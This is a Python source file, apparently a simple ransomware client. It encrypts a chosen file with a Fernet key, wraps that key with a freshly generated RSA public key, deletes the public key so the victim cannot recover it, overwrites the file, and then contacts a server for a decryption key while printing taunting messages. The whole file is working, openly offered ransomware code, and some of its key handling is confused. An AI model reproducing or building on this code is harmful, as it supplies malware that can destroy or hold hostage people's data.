import socket
import sys
import os # for remove files & run commands

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet


# run -> python3 ransomware_client.py <host> <port> <file>

try:
    hostname = sys.argv[1] 
    port = int(sys.argv[2])
    file_path = sys.argv[3] # name of the file that will be encrypted
except IndexError: # init -> host = 0.0.0.0 | port = 8000 | file = file.txt
    hostname = '0.0.0.0'
    port = 8000 
    file_path = 'file.txt'

def sendEncryptedKey(EncKeyFilePath): # the logic of sending the encrypted public key to the server to obtain the private key that will be used to decrypt the file

    with socket.create_connection((hostname, port)) as s: # connect

        with open(EncKeyFilePath, 'rb') as ekf: 
            encKey = ekf.read() # get encrypted public key

        s.sendall(encKey) # send encrypted public key to server
        print('[*] The public encrypted key was sent to the server') 
        print('[*] Getting the decryption key...')
        privateKey = s.recv(1024) # get private key

    return privateKey
            

def decryptFile(file_path, key): # file decryption logic

    try:
        fernet = Fernet(key) 

        with open(file_path, 'rb') as f:
            encData = f.read() # get encrypted data

        print('[*] Decrypt the data...') 
        decryptedData = fernet.decrypt(encData) # data decryption

        with open(file_path, 'wb') as f:
            f.write(decryptedData) # rewrite the file

        print('[*] Decryption was successful, data was written to a file') 
        print(f'[*] The file {file_path} was successful decrypted')

    except Exception as e:
        print(f'[OOPS...] Error: {e}')
        return

# commands to generate public and private key
commands = ['openssl genrsa -out keys.key 1024', # keys generation
            'openssl rsa -in keys.key -pubout -out public.key', # extract the public key
            'openssl pkey -in keys.key -out private.key'] # extract the private key

for i in range(3):
    os.system(commands[i])

publicEncryptedKey = Fernet.generate_key() # generate symmetric key for fernet init and public key encryption

fernet = Fernet(publicEncryptedKey) # fernet init

with open('public.key', 'rb') as kf:  # save the public key for further encryption
    public_key = serialization.load_pem_public_key( # read public key
        kf.read(),
        backend = default_backend()
    )

publicEncryptedKey = public_key.encrypt( # key encryption
    publicEncryptedKey,
    padding.OAEP( # use OAEP algorithm
        mgf = padding.MGF1(algorithm = hashes.SHA256()), # use SHA256 hashing algorithm
        algorithm = hashes.SHA256(), #  # use SHA256 hashing algorithm
        label = None
    )
)

with open('PublicEncryptedKey.key', 'wb') as kf: # writing the key to a file
    kf.write(publicEncryptedKey) 

os.remove('public.key') # we delete the unencrypted public key to prevent the victim from extracting it

with open(file_path, 'rb') as f: # read & get data from file
    file_data = f.read() 
    encrypted_data = fernet.encrypt(file_data) # encrypt the data

with open(file_path, 'wb') as f:
    f.write(encrypted_data) # rewrite the file

choice = input('[/] Do you want decrypt the file? (y/n)\n Your choice >> ')

if choice.lower() == 'y':
    print('[+] You made the right choice >:)')
    print('[*] Connecting...')
    privateKey = sendEncryptedKey('PublicEncryptedKey.key')
    decryptFile(file_path, privateKey)
    
else:
    print('[...] Okay..')
    print('[OOPS...] Decrypt it yourself >:)')
